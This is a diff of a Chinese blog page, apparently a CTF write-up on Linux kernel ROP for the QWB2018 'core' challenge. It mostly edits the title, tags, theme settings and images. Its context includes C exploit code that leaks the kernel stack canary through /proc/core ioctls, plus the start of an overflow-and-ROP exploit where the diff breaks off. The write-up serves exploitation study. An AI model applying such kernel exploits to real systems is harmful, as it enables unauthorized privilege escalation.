@@ -133,15 +133,16 @@
         
         <meta name="description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Linux-Kernel-PWN（二）Kernel ROP - 从QWB2018-core入门">
+<meta property="og:title" content="[Linux-Kernel-PWN] Kernel ROP">
 <meta property="og:url" content="https://hackc0der.github.io/2026/01/18/Linux-Kernel-PWN%EF%BC%88%E4%BA%8C%EF%BC%89Kernel-ROP/index.html">
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://hackc0der.github.io/images/redefine-og.webp">
 <meta property="article:published_time" content="2026-01-18T07:16:29.000Z">
-<meta property="article:modified_time" content="2026-02-01T16:49:33.220Z">
+<meta property="article:modified_time" content="2026-02-14T02:25:11.619Z">
 <meta property="article:author" content="John Doe">
+<meta property="article:tag" content="Linux Kernel PWN">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://hackc0der.github.io/images/redefine-og.webp">
     
@@ -155,7 +156,7 @@
     
     <title>
         
-            Linux-Kernel-PWN（二）Kernel ROP - 从QWB2018-core入门 | HackC0der&#39;s Blog
+            [Linux-Kernel-PWN] Kernel ROP | HackC0der&#39;s Blog
         
     </title>
 
@@ -198,7 +199,7 @@
 
     <script id="hexo-configurations">
     window.config = {"hostname":"hackc0der.github.io","root":"/","language":"zh-CN","path":"search.json"};
-    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":true,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":true},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":true,"custom_message":null},"side_tools":{"gear_rotation":true,"auto_expand":true},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"What you have done does make who you are...","subtitle":{"text":["明月几时有，把酒问青天","不知天上宫阙，今夕是何年？","我欲乘风归去，又恐琼楼玉宇，高处不胜寒。","起舞弄清影，何似在人间！","转朱阁，低绮户，照无眠。","不应有恨，何事长向别时圆？","人有悲欢离合，月有阴晴圆缺，此事古难全。","但愿人长久，千里共婵娟。","我步入丛林，因为我希望活得有意义…","我希望活得深刻，汲取生命所有的精髓！","把非生命的一切全都击溃…","以免在我生命终结时，发现自己从来没有活过…"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"default","links":{"github":"https://github.com/HackC0der","instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1"}},"version":"2.8.5","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"CSDN":{"path":"https://blog.csdn.net/Mr_Fmnwon?type=blog","icon":"fa-sharp fa-solid fa-browser"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2025/11/27 23:36:22"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":true,"title_alignment":"left","headings_top_spacing":{"h1":"2.6rem","h2":"2.2rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":true,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":true,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1300px","sidebar_width":"400px","hover":{"shadow":true,"scale":true},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":true,"custom_message":null},"side_tools":{"gear_rotation":true,"auto_expand":true},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"What you have done does make who you are...","subtitle":{"text":["明月几时有，把酒问青天","不知天上宫阙，今夕是何年？","我欲乘风归去，又恐琼楼玉宇，高处不胜寒。","起舞弄清影，何似在人间！","转朱阁，低绮户，照无眠。","不应有恨，何事长向别时圆？","人有悲欢离合，月有阴晴圆缺，此事古难全。","但愿人长久，千里共婵娟。","我步入丛林，因为我希望活得有意义…","我希望活得深刻，汲取生命所有的精髓！","把非生命的一切全都击溃…","以免在我生命终结时，发现自己从来没有活过…"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"default","links":{"github":"https://github.com/HackC0der","instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1"}},"version":"2.8.5","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"CSDN":{"path":"https://blog.csdn.net/Mr_Fmnwon?type=blog","icon":"fa-sharp fa-solid fa-browser"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2025/11/27 23:36:22"};
     window.lang_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
     window.data = {"masonry":false};
   </script>
@@ -505,7 +506,7 @@
 
         <div class="statistics flex justify-around my-2.5">
     <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
-        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">4</div>
         <div class="label text-third-text-color text-sm">标签</div>
     </a>
     <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
@@ -513,7 +514,7 @@
         <div class="label text-third-text-color text-sm">分类</div>
     </a>
     <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
-        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">5</div>
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">6</div>
         <div class="label text-third-text-color text-sm">文章</div>
     </a>
 </div>
@@ -536,7 +537,7 @@
 		<div class="article-title relative w-full">
 			
 			<div class="w-full flex items-center pt-6 justify-start">
-				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">Linux-Kernel-PWN（二）Kernel ROP - 从QWB2018-core入门</h1>
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">[Linux-Kernel-PWN] Kernel ROP</h1>
 			</div>
 			
 		</div>
@@ -564,13 +565,24 @@
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2026-02-02 00:49:33</span>
-            <span class="mobile">2026-02-02 00:49:33</span>
+            <span class="desktop">2026-02-14 10:25:11</span>
+            <span class="mobile">2026-02-14 10:25:11</span>
             <span class="hover-info">更新</span>
         </span>
     
 
     
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/Linux-Kernel-PWN/">Linux Kernel PWN</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
     
 
     
@@ -646,7 +658,7 @@
 <div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cpio -idmv &lt; ../core.cpio</span><br></pre></td></tr></table></figure></div>
 
 <p>查看启动文件</p>
-
+<img lazyload src="/images/loading.svg" data-src="/2026/01/18/Linux-Kernel-PWN%EF%BC%88%E4%BA%8C%EF%BC%89Kernel-ROP/image-20260121235707939.png" class title="image-20260121235707939">
 
 <p>内核模块<code>core.ko</code>大概率就是我们要分析的漏洞点，拖入IDA进行分析；此外，我们可以在<code>/tmp/kallsyms</code>文件查看内核函数符号</p>
 <p>删去定时关机的命令，然后重新打包。文件系统根目录下有打包脚本<code>gen_cpio.sh</code>：</p>
@@ -656,17 +668,17 @@
 <div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./gen_cpio.sh ../core.cpio</span><br></pre></td></tr></table></figure></div>
 
 <p>启动时发现一闪而过的报错<code>out of memory</code>，此时我们扩大<code>qemu</code>启动时的内存参数为<code>256M</code>即可正常启动：</p>
-
+<img lazyload src="/images/loading.svg" data-src="/2026/01/18/Linux-Kernel-PWN%EF%BC%88%E4%BA%8C%EF%BC%89Kernel-ROP/image-20260129215520858.png" class title="image-20260129215520858">
 
 <p>为此我们可以在这里看源码：<a class="link" target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v4.15.8/source">Linux source code (v4.15.8) - Bootlin Elixir Cross Referencer<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
-<h3 id="（二）内核模块core-ko分析"><a href="#（二）内核模块core-ko分析" class="headerlink" title="（二）内核模块core.ko分析"></a>（二）内核模块core.ko分析</h3>
+<h3 id="（二）内核模块core-ko分析"><a href="#（二）内核模块core-ko分析" class="headerlink" title="（二）内核模块core.ko分析"></a>（二）内核模块core.ko分析</h3><img lazyload src="/images/loading.svg" data-src="/2026/01/18/Linux-Kernel-PWN%EF%BC%88%E4%BA%8C%EF%BC%89Kernel-ROP/image-20260122112831820.png" class title="image-20260122112831820">
 
 <p>开启了<code>canary</code>和<code>NX</code>。拖进IDA进行分析</p>
 <p><code>init_module</code></p>
 <blockquote>
 <p>init_module() 函数是 Linux 内核模块的初始化函数之一。在编写内核模块时，init_module() 用于执行在模块加载时需要初始化的任务，例如注册设备、初始化资源、配置网络接口等操作。</p>
 </blockquote>
-
+<img lazyload src="/images/loading.svg" data-src="/2026/01/18/Linux-Kernel-PWN%EF%BC%88%E4%BA%8C%EF%BC%89Kernel-ROP/image-20260121235949000.png" class title="image-20260121235949000">
 
 <p>proc_create 是 Linux 内核中的一个函数，用于创建一个新的 &#x2F;proc 文件系统条目。这个函数常用于内核模块中，以便在 &#x2F;proc 文件系统下创建一个新的文件，使得用户空间程序可以通过这个文件与内核模块进行交互。</p>
 <div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc_dir_entry</span> *<span class="title">proc_create</span> \</span></span><br><span class="line"><span class="class">    (<span class="title">const</span> <span class="title">char</span> *<span class="title">name</span>, <span class="title">umode_t</span> <span class="title">mode</span>, <span class="keyword">struct</span> <span class="title">proc_dir_entry</span> *<span class="title">parent</span>, <span class="title">const</span> <span class="keyword">struct</span> <span class="title">file_operations</span> *<span class="title">fops</span>);</span></span><br></pre></td></tr></table></figure></div>
@@ -772,14 +784,14 @@
 
 <h4 id="3-LEAK-Canary"><a href="#3-LEAK-Canary" class="headerlink" title="3.LEAK Canary"></a>3.<code>LEAK Canary</code></h4><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span>      <span class="comment">// printf(), puts()</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span>     <span class="comment">// uint8_t, uint64_t</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span>  <span class="comment">// ioctl()</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span>      <span class="comment">// open()</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span>     <span class="comment">// exit()</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span>     <span class="comment">// write()</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SUCCESS_MSG(msg)    <span class="string">&quot;\033[32m\033[1m[+] &quot;</span> msg <span class="string">&quot;\033[0m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INFO_MSG(msg)       <span class="string">&quot;\033[34m\033[1m[*] &quot;</span> msg <span class="string">&quot;\033[0m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ERROR_MSG(msg)      <span class="string">&quot;\033[31m\033[1m[-] &quot;</span> msg <span class="string">&quot;\033[0m&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_success(msg)    puts(SUCCESS_MSG(msg))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_success_fmt(fmt, ...)  printf(SUCCESS_MSG(fmt) <span class="string">&quot;\n&quot;</span>, ##__VA_ARGS__)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_info(msg)       puts(INFO_MSG(msg))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_info_fmt(fmt, ...)  printf(INFO_MSG(fmt) <span class="string">&quot;\n&quot;</span>, ##__VA_ARGS__)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_error(msg)      puts(ERROR_MSG(msg))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CORE_IOCTL_COPY 0x6677889A</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CORE_IOCTL_READ 0x6677889B</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CORE_IOCTL_SETOFF 0x6677889C</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 与core_read交互的函数</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_read</span><span class="params">(<span class="type">int64_t</span> fd, <span class="type">uint8_t</span>* buf)</span>&#123;</span><br><span class="line">	<span class="type">int</span> status = ioctl(fd, CORE_IOCTL_READ, buf);</span><br><span class="line">    <span class="keyword">if</span>(status)&#123;</span><br><span class="line">        log_error(<span class="string">&quot;core_read failed&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    log_success(<span class="string">&quot;leak data:&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">64</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i%<span class="number">8</span> == <span class="number">0</span> &amp;&amp; i)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%hhx &quot;</span>, buf[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n%s\n&quot;</span>,buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 与core_setoff交互的函数</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">setoff</span><span class="params">(<span class="type">int64_t</span> fd, <span class="type">int64_t</span> newoff)</span>&#123;</span><br><span class="line">    <span class="type">int</span> status = ioctl(fd, CORE_IOCTL_SETOFF, newoff);</span><br><span class="line">    <span class="keyword">if</span>(status)&#123;</span><br><span class="line">        log_error(<span class="string">&quot;setoff failed&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    log_success(<span class="string">&quot;setoff success&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 与core_write交互的函数</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_write</span><span class="params">(<span class="type">int64_t</span> fd, <span class="type">uint8_t</span>* payload, <span class="type">size_t</span> size)</span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 与core_copy_func交互的函数</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_copy_func</span><span class="params">(<span class="type">int64_t</span> fd, <span class="type">uint64_t</span> copy_size)</span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">exploit</span><span class="params">()</span>&#123;</span><br><span class="line">    log_info(<span class="string">&quot;start exploiting...&quot;</span>);</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/proc/core&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        log_error(<span class="string">&quot;open /proc/core failed&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    log_success(<span class="string">&quot;open /proc/core success&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// LEAK Canary</span></span><br><span class="line">    <span class="type">uint8_t</span> buffer[USER_BUFF_SIZE];</span><br><span class="line">    setoff(fd, LEAK_OFF);</span><br><span class="line">    core_read(fd, buffer);</span><br><span class="line">    <span class="type">uint64_t</span> canary = *(<span class="type">uint64_t</span>*)(&amp;buffer[USER_BUFF_SIZE-LEAK_OFF]);</span><br><span class="line">    log_success_fmt(<span class="string">&quot;canary: %lx&quot;</span>, canary);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    exploit();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
 
-
+<img lazyload src="/images/loading.svg" data-src="/2026/01/18/Linux-Kernel-PWN%EF%BC%88%E4%BA%8C%EF%BC%89Kernel-ROP/image-20260201165253546.png" class title="image-20260201165253546">
 
 <h4 id="4-Integer-Overflow-Stack-Overflow-ROP"><a href="#4-Integer-Overflow-Stack-Overflow-ROP" class="headerlink" title="4.Integer-Overflow + Stack-Overflow + ROP"></a>4.<code>Integer-Overflow + Stack-Overflow + ROP</code></h4><p>首先通过<code>write</code>向文件写入<code>ROP Chain</code>，然后写入一个最高位置<code>1</code>的64位无符号数（对应负的有符号数），通过<code>(signed)num &lt; 64</code>检查后，利用<code>qmemcpy</code>溢出</p>
 <div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span>      <span class="comment">// printf(), puts()</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span>     <span class="comment">// uint8_t, uint64_t</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span>  <span class="comment">// ioctl()</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span>      <span class="comment">// open()</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span>     <span class="comment">// exit()</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span>     <span class="comment">// write()</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SUCCESS_MSG(msg)    <span class="string">&quot;\033[32m\033[1m[+] &quot;</span> msg <span class="string">&quot;\033[0m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INFO_MSG(msg)       <span class="string">&quot;\033[34m\033[1m[*] &quot;</span> msg <span class="string">&quot;\033[0m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ERROR_MSG(msg)      <span class="string">&quot;\033[31m\033[1m[-] &quot;</span> msg <span class="string">&quot;\033[0m&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_success(msg)    puts(SUCCESS_MSG(msg))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_success_fmt(fmt, ...)  printf(SUCCESS_MSG(fmt) <span class="string">&quot;\n&quot;</span>, ##__VA_ARGS__)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_info(msg)       puts(INFO_MSG(msg))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_info_fmt(fmt, ...)  printf(INFO_MSG(fmt) <span class="string">&quot;\n&quot;</span>, ##__VA_ARGS__)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_error(msg)      puts(ERROR_MSG(msg))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CORE_IOCTL_COPY 0x6677889A</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CORE_IOCTL_READ 0x6677889B</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CORE_IOCTL_SETOFF 0x6677889C</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> USER_BUFF_SIZE 64</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LEAK_OFF USER_BUFF_SIZE</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 与core_read交互的函数</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_read</span><span class="params">(<span class="type">int64_t</span> fd, <span class="type">uint8_t</span>* buf)</span>&#123;</span><br><span class="line">	<span class="type">int</span> status = ioctl(fd, CORE_IOCTL_READ, buf);</span><br><span class="line">    <span class="keyword">if</span>(status)&#123;</span><br><span class="line">        log_error(<span class="string">&quot;core_read failed&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    log_success(<span class="string">&quot;leak data:&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">64</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i%<span class="number">8</span> == <span class="number">0</span> &amp;&amp; 